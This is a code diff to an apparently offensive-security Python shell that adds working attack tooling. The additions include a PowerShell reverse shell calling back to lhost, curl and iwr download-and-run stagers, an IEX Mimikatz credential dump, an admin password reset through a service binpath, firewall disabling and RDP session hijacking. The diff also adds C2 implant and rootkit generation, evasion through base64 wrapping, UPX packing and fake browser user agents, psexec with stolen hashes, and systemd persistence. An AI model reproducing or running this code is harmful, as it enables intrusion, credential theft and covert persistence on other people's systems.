@@ -86,7 +86,7 @@ class LazyOwnShell(cmd2.Cmd):
         "aslr": "run lazyaslrcheck",
         "asm": "sh /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb",
         "caja": "sh caja sessions",
-        "chown": "sh sudo chown $USER:$USER sessions -R",
+        "chown": "sh sudo chown 1000:1000 . -R",
         "control_dynamic_debug": "sh sudo cat /sys/kernel/debug/dynamic_debug/control", 
         "creds": "sh cat sessions/credentials*",
         "disable_ftrace": "sh sudo sysctl kernel.ftrace_enabled=0",
@@ -108,6 +108,7 @@ class LazyOwnShell(cmd2.Cmd):
         "event_trace": "sh sudo cat /sys/kernel/debug/tracing/trace",
         "ftpsniff": "run lazyftpsniff",
         "gdb": "set debug true",
+        "halt": "sh sudo shutdown -h now",
         "hash": "sh cat sessions/hash*",
         "hosts": "sh sudo nano /etc/hosts",
         "info": "sh echo \"<?php phpinfo(); ?>\" > sessions/info.php",
@@ -133,6 +134,7 @@ class LazyOwnShell(cmd2.Cmd):
         "tor": "sh sudo bash sessions/tor.sh",
         "trace": "sh sudo cat /sys/kernel/tracing/trace",
         "touched_functions": "sh sudo cat /sys/kernel/tracing/touched_functions",
+        "smbd": "sh cd sessions && smbserver.py share . -username test -password test",
         "ses": "sh ls sessions",
         "sniff": "run lazysniff",
         "status": "sh git status",
@@ -198,6 +200,9 @@ class LazyOwnShell(cmd2.Cmd):
             "rport": 1337,
             "lport": 1337,
             "sleep": 6,
+            "c2_maleable_route": "/gmail/v1/users/",
+            "user_agent_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+            "user_agent_lin": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",            
             "rat_key": "82e672ae054aa4de6f042c888111686a",
             "startip": "192.168.1.1",
             "endip": "192.168.1.254",
@@ -294,6 +299,8 @@ class LazyOwnShell(cmd2.Cmd):
                 writer.writeheader()
 
             writer.writerow(log_data)
+        cmd = f"chown 1000:1000 {file_path}"
+        os.system(cmd)
 
     def default(self, line):
         """
@@ -2750,7 +2757,63 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(command)
             self.cmd(command)
         return
+    
+    def do_psexec_py(self, line):
+        """
+        Executes the Impacket PSExec tool to attempt remote execution on the specified target.
 
+        This function performs the following actions:
+        1. Checks if the provided target host (`rhost`) is valid.
+        2. If the `line` argument is "pass", it searches for credential files with the pattern `credentials*.txt`
+        and allows the user to select which file to use for executing the command.
+        3. If the `line` argument is not "pass", it assumes execution without a password (using the current credentials).
+        4. Copies the `rhost` IP address to the clipboard for ease of use.
+
+        Parameters:
+        line (str): A command argument to determine the action.
+                    If "pass", the function searches for credential files and authenticates using the selected file.
+                    Otherwise, it executes PSExec without a password using the `rhost` IP.
+
+        Returns:
+        None
+        """  
+        rhost = self.params["rhost"]
+        
+        
+        if not check_rhost(rhost):
+            return
+
+        if line == "pass":
+            credentials = get_credentials()
+            if not credentials:
+                return
+
+            for user, passwd in credentials:
+                command = f"psexec.py {user}:'{passwd}'@{rhost}"
+                print_msg(command)
+                self.cmd(command)
+            return
+
+        elif line == "hash":
+            hash_value = get_hash()
+            if not hash_value:
+                return
+            if ":" in hash_value:
+                hashis = f"-hashes {hash_value}"
+            else:
+                hashis = f"-hashes :{hash_value}"
+
+            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
+            command = f"psexec.py {user}@{rhost} {hashis}"
+            print_msg(command)
+            self.cmd(command)
+            return
+        else:
+            command = f"psexec.py administrator@{rhost}"
+            print_msg(command)
+            self.cmd(command)
+        return
+    
     def do_rpcdump(self, line):
         """
         Executes the `rpcdump.py` script to dump RPC services from a target host.
@@ -4415,7 +4478,20 @@ class LazyOwnShell(cmd2.Cmd):
                 f"lport and lhost must be assign use: assign lport 443 and assign lhost 10.10.10.10 or use command payload"
             )
             return
-
+        payload = (
+            f"$X1=\"{lhost}\";$X2={lport};$X3=New-Object Net.Sockets.TCPClient($X1,$X2);"
+            "$X4=$X3.GetStream();$Y1=New-Object IO.StreamReader($X4);$Y2=New-Object "
+            "IO.StreamWriter($X4);$Y2.AutoFlush=$true;$Z1=New-Object Byte[] 1024;"
+            "while($X3.Connected){while($X4.DataAvailable){$D1=$X4.Read($Z1,0,$Z1.Length);"
+            "$J1=([Text.Encoding]::UTF8).GetString($Z1,0,$D1)}if($X3.Connected -and $J1.Length -gt 0){"
+            "$D2=try{Invoke-Expression $J1 2>&1}catch{$_};$Y2.Write(\"$D2`n\");$J1=$null}};"
+            "$X3.Close();$X4.Close();$Y1.Close();$Y2.Close()"
+        )
+        print_msg("\nAnother Payload:")
+        print_msg(payload)
+        with open('sessions/revshel2.ps1', "w") as f:
+            f.write(payload)
+        f.close()
         revshell = (
             """$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
         """.replace("{lhost}", lhost)
@@ -4428,15 +4504,11 @@ class LazyOwnShell(cmd2.Cmd):
         with open(filename, "w") as f:
             f.write(revshell)
         f.close()
-        print_msg(
-            f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} "
+
+        copy2clip(
+            f"curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1'"
         )
-        self.cmd(
-            f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1' | xclip -sel clip"
-        )
-        print_msg(
-            f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\revshell.ps1' | xclip -sel clip"
-        )
+        
         return
 
     def do_createhash(self, line):
@@ -5603,6 +5675,12 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show running services", "net start"),
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
+            ("WIN tscon active session id 2", "tscon 2 /dest:console"),
+            ("WIN shado hijack session id 2 rdp", "mstsc /shadow:2 /noconsentprompt /control /v:dc1_host"),
+            ("WIN Mimikatz ps1", f"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"),
+            ("WIN sc.exe change admin pass", 'sc.exe config browser binpath="C:\windows\system32\cmd.exe /c net user administrator Grisgrisgris123!"'),
+            ("WIN firewall off", "netsh advfirewall set allprofiles state off"),
+            ("WIN net use share", f"net.exe use T: \\\\{lhost}\\share /user:test test"),
             ("WIN AD Enum", "('AD_Computers: {0}' -f ([adsiSearcher]'(ObjectClass=computer)').FindAll().count); ([adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))').FindAll()"),
             ("WIN Post Exploit Amnesiac", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac.ps1');Amnesiac"),
             ("WIN Post Exploit AmnesiacShell", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac_ShellReady.ps1');Amnesiac"),
@@ -6370,7 +6448,7 @@ class LazyOwnShell(cmd2.Cmd):
             'echo "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"'
         )
         if not line:
-            port = 80
+            port = 443
         else:
             port = line
         print_msg(f"{GREEN} Web server at sessions in port {RED} {port} {RESET}")
@@ -7971,8 +8049,38 @@ class LazyOwnShell(cmd2.Cmd):
 
         copy2clip(command)
         
-        
+    def do_encodewinbase64(self, line):
+        """
+        Encodes a given payload into a Base64 encoded string suitable for Windows PowerShell execution.
 
+        This function takes a payload as input, encodes it into UTF-16 Little Endian format,
+        and then encodes the resulting bytes into a Base64 string. It then constructs PowerShell
+        commands that can execute the encoded payload. The final commands are printed and
+        copied to the clipboard for easy use.
+
+        Args:
+            line (str): The payload to be encoded. If not provided, the function will prompt
+                        the user to enter a payload, defaulting to 'whoami' if no input is given.
+
+        Returns:
+            None
+
+        Example:
+            >>> encoder = Encoder()
+            >>> encoder.do_encodewinbase64('Get-Process')
+            [Outputs the encoded PowerShell commands and copies the final command to the clipboard]
+        """
+        if not line:
+            line = input('    [!] enter the payload (default; whoami): ') or 'whoami'
+        
+        utf16_payload = line.encode('utf-16le')
+        base64_payload = base64.b64encode(utf16_payload).decode('utf-8')
+        final_command = f"powershell /enc {base64_payload}"
+        final_final_command = f"cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}"
+        print_msg(final_command)
+        print_msg(final_final_command)
+        copy2clip(final_command)
+        return
 
     def do_winbase64payload(self, line):
         """
@@ -8047,7 +8155,7 @@ class LazyOwnShell(cmd2.Cmd):
                 return        
         else:
             selected_file = line.strip()
-
+        selected_file = selected_file.replace("sessions/","")
         if payload_type == '1':
             command = f"IEX(New-Object Net.WebClient).downloadString('http://{lhost}/{selected_file}')"
         elif payload_type == '2':
@@ -9726,7 +9834,8 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
             return
-
+        
+        rhost = self.params["rhost"]
         lhost = self.params["lhost"]
         lport = str(self.params["c2_port"])
         rport = str(self.params["rport"])
@@ -9738,13 +9847,20 @@ class LazyOwnShell(cmd2.Cmd):
         bfile = f"{path}/modules/run.bat"
         filek = f"{path}/modules/backdoor/backdoor.c"
         files = f"{path}/modules/backdoor/server.c"
-        cfiles = f"{path}/modules/rootkit/monrev.c"
+        cfiles = f"{path}/modules/rootkit/mr.c"
+        cwfiles = f"{path}/modules/win_rootkit/win_ring3_rootkit.c"
+        mrhyde = f"{path}/modules/win_rootkit/mrhyde.c"
+        rootkit = f"{path}/sessions/mrhyde.so"
+        rootkit_c = f"{path}/modules/rootkit/mrhyde.c"
         file_evil = f"{path}/modules/evilhttprev.sh"
         filer = f"{path}/modules/r.sh"
         gofile = f"{path}/sessions/implant/implant.go"
+        payload_sh = f"{path}/sessions/lin/payload.sh"
         gofile2 = f"{path}/sessions/implant/listener.go"
         implantgo = f"{path}/sessions/{line}"
         implantgo2 = f"{path}/sessions/l_{line}"
+        implant_config_json = f"{path}/sessions/implant_config_{line}.json"
+        maleable = self.params["c2_maleable_route"]
         self.c2_url = f"http://{lhost}:{lport}"
         self.c2_clientid = line.strip()
         USER = "LazyOwn"
@@ -9752,8 +9868,33 @@ class LazyOwnShell(cmd2.Cmd):
         self.c2_auth = (USER, PASS)
         random_bytes = os.urandom(100)
         base64_encoded = base64.b64encode(random_bytes)
+        user_agent_win = self.params["user_agent_win"]
+        user_agent_lin = self.params["user_agent_lin"]
         random_string = base64_encoded.decode('utf-8')[:12]
         working_dir = f"{path}/sessions/"
+        if not choice:
+            choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4 (default 1) : ") or '1'
+
+        if choice == '1':
+            payload = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\\z.ps1`\"\""
+            copy2clip(payload)
+            platform = "windows"
+            user_agent = user_agent_win
+        elif choice == '2':
+            payload = f"curl http://{lhost}/r -o r && sh r"
+            copy2clip(payload)
+            platform = "linux"
+            user_agent = user_agent_lin
+        elif choice == '3':
+            payload = f"powershell iwr -uri  http://{lhost}/batrat.bat -OutFile batrat.bat ; .\\batrat.bat"
+            copy2clip(payload)
+            platform = "windows"
+            user_agent = user_agent_win
+        elif choice == '4':
+            payload = f"curl http://{lhost}/r -o r && sh r"
+            copy2clip(payload)
+            platform = "darwin"
+            user_agent = user_agent_win    
         if not check_lhost(lhost):
             return
 
@@ -9763,10 +9904,21 @@ class LazyOwnShell(cmd2.Cmd):
 
         if not is_exist(file):
             return
+        with open(cwfiles, 'r') as f:
+            cwcontent = f.read()
 
         with open(file, 'r') as f:
             content = f.read()
-        
+
+        with open(payload_sh, 'r') as f:
+            payload_content = f.read()  
+
+        with open(mrhyde, 'r') as f:
+            mrhyde_content = f.read()
+
+        with open(rootkit_c, 'r') as f:
+            rootkit_content = f.read() 
+
         with open(cfiles, 'r') as f:
             content_mon = f.read()
 
@@ -9781,14 +9933,28 @@ class LazyOwnShell(cmd2.Cmd):
         with open(file_evil, 'r') as f:
             evil_content = f.read()
         content_mon = content_mon.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
-        bcontent = bcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
-        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{sleep}", sleep)
+        cwcontent = cwcontent.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
+        bcontent = bcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent)
+        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent)
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{sleep}", sleep)
         evil_content = evil_content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost).replace("{listener}", listener)
-
+        payload_content = payload_content.replace("{line}", line).replace("{lhost}", lhost)
+        rootkit_content = rootkit_content.replace("{line}", line)
+        mrhyde_content = mrhyde_content.replace("{line}", line).replace("{lhost}", lhost)
         server = f"python3 -W ignore lazyc2.py {lport} {USER} {PASS}"
+        
+        with open(f"{path}/sessions/mrhyde.c", 'w+') as f:
+            f.write(rootkit_content)
 
-        with open("sessions/monrev.c", 'w+') as f:
+        with open(f"{path}/sessions/mrhydew.c", 'w+') as f:
+            f.write(mrhyde_content)
+
+        with open("sessions/payload.sh", 'w+') as f:
+            f.write(payload_content)
+        with open("sessions/wmr.c", 'w+') as f:
+            f.write(cwcontent)
+
+        with open("sessions/mr.c", 'w+') as f:
             f.write(content_mon)
 
         with open("sessions/r", 'w+') as f:
@@ -9797,26 +9963,14 @@ class LazyOwnShell(cmd2.Cmd):
         with open("sessions/w", 'w+') as f:
             f.write(wcontent)
 
-        with open("sessions/r.bat", 'w+') as f:
+        with open("sessions/ratbat.bat", 'w+') as f:
             f.write(bcontent)
 
-        if not choice:
-            choice = input("    [!] choice target windows 1, linux 2, windows bat 3 (default 1) : ") or '1'
-
-        if choice == '1':
-            copy2clip(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\\z.ps1`\"\"")
-            platform = "windows"
-        elif choice == '2':
-            copy2clip(f"curl http://{lhost}/r -o r && sh r")
-            platform = "linux"
-        elif choice == '3':
-            copy2clip(f"iwr -uri  http://{lhost}/b.bat -OutFile b.bat ; .\\b.bat")
-            platform = "windows"
 
         with open(filek, 'r') as f:
             content = f.read()
 
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
+        content = content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/b.c", 'w+') as f:
             f.write(content)
 
@@ -9828,7 +9982,7 @@ class LazyOwnShell(cmd2.Cmd):
         
         print_msg(f"curl -o l_{line} http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &")
 
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
+        content = content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", rhost)
         with open("sessions/server.c", 'w+') as f:
             f.write(content)
         with open(filer, 'r') as f:
@@ -9844,7 +9998,7 @@ class LazyOwnShell(cmd2.Cmd):
         with open(gofile2, 'r') as f:
             lcontent = f.read()
 
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep)
+        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent)
         lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
         implant_go = implantgo + ".go"
         implant_go2 = implantgo + "_l.go"
@@ -9858,28 +10012,84 @@ class LazyOwnShell(cmd2.Cmd):
             f.write(lcontent)
         
         if platform == "linux":
-            compile_command = f"GOOS=linux GOARCH=amd64 go build -o {implantgo} {implant_go}"
-            compile_command2 = f"GOOS=linux GOARCH=amd64 go build -o {implantgo2} {implant_go2}"
-            command_curl = f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &"
-            command_curl2 = f"curl -o l_{line} http://{lhost}/l_{line} ; chmod +x l_{line} ; ./l_{line} &"
-            command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/monrev.c -lpthread"
+            binary = line
+            compile_command = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/mr.c -lpthread  -lssl -lcrypto"
+            command_rootkit = f"gcc -fPIC -shared -o {rootkit} -ldl {path}/sessions/mrhyde.c"
+
+            self.cmd(command_rootkit)
             self.cmd(command_mon)
-            self.onecmd(f"upload_c2 {self.sessions_dir}/monrev")
-            print_msg(command_curl)
-            print_msg(command_curl2)
-            self.onecmd(f"ssh_cmd {command_curl}")
-            self.onecmd(f"ssh_cmd {command_curl2}")
+            self.cmd(compile_command)
+            self.cmd(compile_command2)            
             self.onecmd(f"service {line}")
             self.onecmd(f"service l_{line}")
+            ofuscate = f"cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
+            self.cmd(ofuscate)
+            curl_payload = f"curl -o payload.sh http://{lhost}/payload.sh ; chmod +x payload.sh ; ./payload.sh "
+            print_msg(curl_payload)
+            upx = f"upx {self.sessions_dir}/{binary}"
+            self.cmd(upx)
+            upx = f"upx {self.sessions_dir}/monrev"
+            self.cmd(upx)            
         elif platform == "windows":
-            compile_command = f"GOOS=windows GOARCH=amd64 go build -o {implantgo} {implant_go}"
-            compile_command2 = f"GOOS=windows GOARCH=amd64 go build -o {implantgo2} {implant_go2}"
+            binary = f"{line}.exe"
+            compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
+            command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
             print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`\"\"")
             print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\"")
-        self.cmd(compile_command)
-        self.cmd(compile_command2)
+            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/b{line}.exe -OutFile b{line}.exe ; .\\b{line}.exe`\"\"")
+
+            self.cmd(compile_cw)
+            self.cmd(command_mrhyde)
+            self.cmd(compile_command)
+            self.cmd(compile_command2)
+            upx = f"upx {self.sessions_dir}/{binary}"
+            self.cmd(upx)
+            upx = f"upx {self.sessions_dir}/b{binary}"
+            self.cmd(upx)            
+        elif platform == "darwin":
+            binary = line
+            compile_command = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
+            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
+
+            self.cmd(compile_command)
+            self.cmd(compile_command2)
+            upx = f"upx {self.sessions_dir}/{binary}"
+            self.cmd(upx)
         print_msg(f"Go agent {implantgo} compiled successfully.")
-        
+        md5 = f"md5sum {self.sessions_dir}/{binary}"
+        md5sum = self.cmd(md5)
+
+        now = datetime.now()
+        now_str = now.strftime("%Y-%m-%d %H:%M:%S")
+        json_content = {
+            "id": random_string,
+            "name": line,
+            "binary": f"{path}/sessions/{binary}",
+            "url_binary": f"http://{lhost}/{binary}",
+            "os_id": choice,
+            "os": platform,
+            "rhost": rhost,
+            "log": f"{path}/sessions/{line}.log",
+            "user_agent": user_agent,
+            "maleable_route": maleable,
+            "url": self.c2_url,
+            "sleep": sleep,
+            "username": USER,
+            "password": PASS,
+            "working_path": working_dir,
+            "payload": payload,
+            "created": now_str
+        }
+        with open(f"{implant_config_json}", 'w+') as f:
+            json.dump(json_content, f, indent=4)
+
+        self.onecmd("create_session_json")
         if is_port_in_use(int(lport)):
             command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
             self.cmd(command)
@@ -14125,7 +14335,7 @@ class LazyOwnShell(cmd2.Cmd):
         This function starts a `nc` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.
 
         Usage:
-            pwncatcs <port>
+            nc <port>
 
         :param line: The port number to use for the `nc` listener. If not provided, it defaults to the `lport` parameter.
         :type line: str
@@ -14182,6 +14392,71 @@ class LazyOwnShell(cmd2.Cmd):
             f"{RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}"
         )
         return
+
+    def do_rnc(self, line):
+        """
+        Runs `nc` with rlwrap  the specified port for listening.
+
+        This function starts a `nc` listener with rlwrap  on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.
+
+        Usage:
+            rnc <port>
+
+        :param line: The port number to use for the `nc` listener. If not provided, it defaults to the `lport` parameter.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        1. Ensure that `nc` is installed and accessible from your command line.
+        2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
+        3. Run the function to start `nc` on the specified port.
+
+        If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.
+
+        After starting the listener, the function prints a message indicating that `nc` is running on the specified port and another message when the session is closed.
+
+        Dependencies:
+        - `nc`: A tool used for creating reverse shells or bind shells.
+        """
+
+        lport = self.params["lport"]
+        if not lport and not line:
+            print_error(
+                f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}"
+            )
+            return
+        if not line:
+                if int(lport) < 1024:
+                    print_msg(f"Try.. sudo rlwrap nc -lvnp {lport}{RESET}")
+                    self.cmd(f"sudo rlwrap nc -lvnp {lport}")
+                else:
+                    print_msg(f"Try.. rlwrap nc -lvnp {lport}{RESET}")
+                    self.cmd(f"rlwrap nc -lvnp {lport}")
+        else:
+            if line.startswith("file"):
+                args = line.split(" ")
+                if len(args) == 2:
+                    filename = args[1]
+                    command = f"rlwrap nc -lp {lport} > sessions/{filename}"
+                    print_msg(command)
+                    self.cmd(command)
+                    
+                else:
+                    command = f"rlwrap nc -lp {lport} > sessions/secret.zip"
+                    print_msg(command)
+                    self.cmd(command)
+                    
+            else:
+                if int(line) < 1024:
+                    print_msg(f"Try.. sudo rlwrap nc -lvnp {line}{RESET}")
+                    self.cmd(f"sudo rlwrap nc -lvnp {line}")
+                else:
+                    print_msg(f"Try.. rlwrap nc -lvnp {line}{RESET}")
+                    self.cmd(f"rlwrap nc -lvnp {line}")
+        print_msg(
+            f"{RED}[*] {YELLOW} Shutdown rlwrap nc sessions in port {RED} [{lport}|{line}] {RESET}"
+        )
+        return    
 
     def do_createjsonmachine(self, line):
         """
@@ -19574,6 +19849,7 @@ class LazyOwnShell(cmd2.Cmd):
             as_country = self.ip2asn.as_country.get(asn, "Unknown")
             print_msg(f"IP {ip} is part of ASN {asn} ({as_name}, {as_country})")
         self.logcsv(f"ip2asn {line}")
+
     def do_atomic_tests(self, line):
         """
         Executes Atomic Red Team tests based on user-selected platform and test.
@@ -19600,6 +19876,10 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn("Atomic Red Team repository not found. Cloning...")
             self.cmd(f"git clone {atomic_repo} {atomic_path}")
             print_msg("Repository cloned successfully.")
+        else:
+            command = f"cd {atomic_path} && git pull"
+            print_msg("Try to update...")
+            self.cmd(command)
 
         print_msg("Select the platform to target:")
         platforms = ['windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp']
@@ -19751,7 +20031,10 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn("Atomic Red Team repository not found. Cloning...")
             self.cmd(f"git clone {atomic_repo} {atomic_path}")
             print_msg("Repository cloned successfully.")
-
+        else:
+            command = f"cd {atomic_path} && git pull"
+            print_msg("Try to update...")
+            self.cmd(command)
         if not os.path.exists(sessions_path):
             os.makedirs(sessions_path)
 
@@ -20160,6 +20443,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Slash Filtering: {slash_filtered}")
         copy2clip(quote_filtered)
         self.logcsv(f"filtering {line}")
+
     def do_lol(self, line):
         """
         Exploits a target by injecting a malicious payload and collecting admin information.
@@ -22068,8 +22352,10 @@ class LazyOwnShell(cmd2.Cmd):
             - All: Sequentially executes all techniques described above.
         """
 
-  
-        script_path = get_users_dic("ps1")
+        if not line:
+            script_path = get_users_dic("ps1")
+        else: 
+            script_path = line.strip()
 
         def load_chameleon():
 
@@ -22729,7 +23015,9 @@ class LazyOwnShell(cmd2.Cmd):
             "hashes": [],
             "timestamp": timestamp,
             "notes": None,
-            "id_rsa": []
+            "plan": None,
+            "id_rsa": [],
+            "implants": []
         }
         credentials_files = glob.glob(os.path.join(sessions, 'credentials*.txt'))
         for i, file in enumerate(credentials_files, start=1):
@@ -22754,13 +23042,30 @@ class LazyOwnShell(cmd2.Cmd):
         if os.path.exists(notes_file):
             with open(notes_file, 'r') as f:
                 session_data["notes"] = f.read().strip()
+        plan_file = os.path.join(sessions, 'plan.txt')
+        if os.path.exists(plan_file):
+            with open(plan_file, 'r') as f:
+                session_data["plan"] = f.read().strip()                
         id_rsa_files = glob.glob(os.path.join(sessions, 'id_rsa*'))
         for file in id_rsa_files:
             with open(file, 'r') as f:
                 session_data["id_rsa"].append(f.read().strip())
+        implant_files = glob.glob(os.path.join(sessions, 'implant_config*.json'))
+        
+        for i, file in enumerate(implant_files, start=1):
+            with open(file, 'r') as f:
+                content = f.read().strip()
+                session_data["implants"].append({
+                    "implant": i,
+                    "content": content
+                })
+        redop_file = os.path.join(sessions, 'status_redop.txt')
+        if os.path.exists(redop_file):
+            with open(redop_file, 'r') as f:
+                session_data["redop"] = f.read().strip()         
         with open(session_file, 'w') as f:
             json.dump(session_data, f, indent=4)
-
+        self.onecmd("load_session")
     def do_shellcode2elf(self, line):
         """
         Convert shellcode into an ELF file and infect it.
@@ -23121,7 +23426,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f" \_ {range}")
         return 
 
-    def do_service(self, line):
+    def do_service_ssh(self, line):
         """
         Creates a systemd service file for a specified binary and generates a script to enable and start the service.
 
@@ -23190,6 +23495,75 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Run the following command to enable and start the service:")
         self.onecmd(f"ssh_cmd {cmd}")
 
+    def do_service(self, line):
+        """
+        Creates a systemd service file for a specified binary and generates a script to enable and start the service.
+
+        This function takes the name of a binary as input, creates a systemd service file for it, and generates a shell script
+        to enable and start the service. The script is saved in the sessions directory and a command is provided to execute
+        the script remotely via SSH.
+
+        Args:
+            line (str): The command line input containing the name of the binary. If an absolute path is not provided,
+                        a default path is used.
+
+        Returns:
+            None
+
+        Raises:
+            None
+
+        Example:
+            >>> service my_binary_name
+        """    
+        binary_name = line.strip()
+        lhost = self.params["lhost"]
+        if not binary_name:
+            print_error("No binary name provided.")
+            return
+
+        default_path = f"/home/.grisun0/services/{binary_name}"
+        binary_path = default_path if not os.path.isabs(binary_name) else binary_name
+
+        service_content = f"""#!/bin/bash
+        SOURCE_FILE="{line}.service"
+        cat > $SOURCE_FILE <<EOL
+        [Unit]
+        Description=My Custom Service for {binary_name}
+        After=network.target
+
+        [Service]
+        ExecStart={binary_path}
+        WorkingDirectory=/home/.grisun0/services
+        StandardOutput=inherit
+        StandardError=inherit
+        Restart=always
